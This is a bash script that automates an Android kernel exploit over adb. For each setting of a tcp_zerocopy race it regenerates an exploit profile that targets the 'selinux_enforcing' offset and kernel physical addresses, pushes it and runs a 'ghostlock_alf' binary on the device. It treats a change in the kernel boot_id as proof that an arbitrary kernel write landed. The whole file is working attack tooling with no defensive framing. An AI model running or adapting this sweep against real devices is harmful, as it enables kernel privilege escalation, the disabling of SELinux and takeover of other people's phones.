#!/bin/bash
# Sweep tcp_zerocopy race params with boot_id as write-oracle.
# Regenerates the bin per combo, pushes, runs, checks /proc/sys/kernel/random/boot_id.
export MSYS_NO_PATHCONV=1
ADB="$LOCALAPPDATA/Android/Sdk/platform-tools/adb.exe"
cd /c/Users/jaqenze/.zcode/workspace/default

run_combo() {
  local arm=$1 hold=$2
  python - "$arm" "$hold" <<'PYEOF'
import sys, bin_tool
arm, hold = int(sys.argv[1]), int(sys.argv[2])
p = bin_tool.parse('xf3p_ghostlock.bin')
new = []
for name, entries in p['sections']:
    if name == 'offset':
        entries = [(k, (0x257a548 if k == 'selinux_enforcing' else v)) for k, v in entries]
    if name == 'kernel':
        entries = [(k, v) for k, v in entries if k not in ('kernel_phys_load', 'kernel_phys_offset')]
        entries += [('kernel_phys_load', 0xA8000000), ('kernel_phys_offset', 0x80000000)]
    if name == 'route.tcp_zerocopy':
        entries = [(k, (arm if k == 'arm_sequence' else hold if k == 'post_receive_hold_iterations' else v)) for k, v in entries]
    new.append((name, entries))
p['sections'] = new
bin_tool.emit(p, 'xf3p_sweep.bin')
PYEOF
  "$ADB" push xf3p_sweep.bin /data/local/tmp/xf3p_sweep.bin >/dev/null 2>&1 || { echo "push failed"; return; }
  local before=$("$ADB" shell 'cat /proc/sys/kernel/random/boot_id' | tr -d '\r\n')
  "$ADB" shell "cd /data/local/tmp && timeout 200 ./ghostlock_alf --load-prebuilt-profile ./xf3p_sweep.bin > ./sweep_run.out 2>&1" </dev/null >/dev/null 2>&1
  local after=$("$ADB" shell 'cat /proc/sys/kernel/random/boot_id' | tr -d '\r\n')
  local verdict="UNCHANGED"
  [ "$before" != "$after" ] && verdict="*** WRITE LANDED ***"
  echo "arm=$arm hold=$hold -> $verdict"
  [ "$verdict" != "UNCHANGED" ] && { echo "BEFORE=$before"; echo "AFTER=$after"; "$ADB" pull /data/local/tmp/sweep_run.out "xf3p_attempts/sweep_arm${arm}_hold${hold}.out" >/dev/null 2>&1; return 10; }
  return 0
}

for arm in 1 2 4 8 32 64 128; do
  run_combo "$arm" 20000
  rc=$?
  [ $rc -eq 10 ] && { echo "HIT at arm=$arm"; exit 0; }
  sleep 3
done
echo "arm sweep done, no hit; sweeping hold"
for hold in 1000 5000 80000; do
  run_combo 16 "$hold"
  rc=$?
  [ $rc -eq 10 ] && { echo "HIT at hold=$hold"; exit 0; }
  sleep 3
done
echo "sweep complete, no hit"
